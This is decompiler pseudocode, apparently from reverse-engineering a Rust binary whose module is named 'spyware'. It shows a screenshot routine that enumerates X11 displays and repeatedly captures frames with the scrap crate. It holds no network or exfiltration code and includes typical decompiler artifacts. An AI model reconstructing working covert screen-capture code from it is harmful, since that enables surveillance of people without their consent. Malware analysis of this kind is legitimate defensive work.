fn spyware::actions::screenshot_actions::get_screenshot_request() -> : struct32 {
    let a0: i64;  // rdi
    let v1: struct24;  // [bp-0x178], Other Possible Types: struct40, struct64
    let v2: u64;  // [bp-0x170]
    let v3: u64;  // [bp-0x168]
    let v4: u128;  // [bp-0x160]
    let v5: struct24;  // [bp-0x130], Other Possible Types: struct8
    let v6: struct16;  // [bp-0x118]
    let v7: u64;  // [bp-0x110]
    let v8: u128;  // [bp-0x108]
    let v9: struct24;  // [bp-0x108]
    let v10: u64;  // [bp-0xf8]
    let v11: u64;  // [bp-0xe0]
    let v12: struct24;  // [bp-0xd8], Other Possible Types: struct40
    let v13: struct64;  // [bp-0xd8]
    let v14: struct24;  // [bp-0x90]
    let v15: u128;  // [bp-0x78]
    let v16: struct32;  // [bp-0x68]
    let v17: struct24;  // [bp-0x48]
    let v20: struct24;  // [bp-0xf0]

    v5 = struct24 {
        field_0: 0
        field_8: ""
    };
    if core::sync::atomic::atomic_load() >= 4 {
        v1 = "Getting screenshot";
        v2 = 1;
        v3 = 8;
        v4 = 0;
        v12 = struct40 {
            field_0: "spyware::actions::screenshot_actions"
            field_16: "spyware::actions::screenshot_actions"
            field_32: log::__private_api::loc("src/actions/screenshot_actions.rs")
        };
        log::__private_api::log(&v1, 4, &v12);
    }
    scrap::common::x11::Display::all(&v1);
    v17 = core::result::Result<T,E>::expect(&v1);
    v16 = <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v17);
    v14 = <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v16);
    if *((&v14.field_16 as &char + 4) as &i8) == 2 {
        return struct32 {
            field_0: *(&v5.field_0 as &i128)
            field_16: 0
            field_24: 0x8000000000000000
        };
    }
    v10 = v14.field_16;
    v8 = *(&v14.field_0 as &i128);
    println!("Display id ");
    v12 = v9;
    v1 = scrap::common::x11::Capturer::new(&v12);
    v13 = core::result::Result<T,E>::expect(&v1);
    v15 = BinaryOp InterleaveLOV;
    loop {
        loop {
            vvar_263{stack -280} = struct16 OrderedDict([(0, 𝜙@64b [((4558965, None), vvar_198{stack -280}), ((4559009, None), vvar_198{stack -280}), ((4558813, None), None)]), (8, 𝜙@64b [((4558965, None), vvar_199{stack -272}), ((4559009, None), vvar_199{stack -272}), ((4558813, None), None)])])
            scrap::common::x11::Capturer::frame(&v6, &v13);
            if !v6.field_0 {
                break;
            }
            v20 = <T as alloc::slice::hack::ConvertVec>::to_vec(v6.field_0, v7);
            v1 = struct40 {
                field_0: *(&v20.field_0 as &i128)
                field_16: v11
                field_24: v15
            };
            v5 = alloc::vec::Vec<T,A>::push(&v1);
        }
        if std::io::error::Error::kind(v7) != 13 {
            break;
        }
        std::thread::sleep(None, 16666666);
    }
    panic!("Error: {}", &v0);
}
